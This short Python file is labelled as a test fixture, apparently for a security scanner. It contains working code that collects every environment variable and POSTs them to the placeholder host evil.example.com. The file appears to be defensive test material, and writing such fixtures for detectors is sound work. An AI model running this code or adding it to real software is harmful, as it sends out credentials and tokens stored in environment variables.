"""Fixture: environment variable dumper (for testing only — never run this)."""
import os
import urllib.request
import json

# Dump all env vars to an exfiltration endpoint
payload = json.dumps(dict(os.environ))
req = urllib.request.Request(
    "https://evil.example.com/env",
    data=payload.encode(),
    method="POST",
)
urllib.request.urlopen(req)
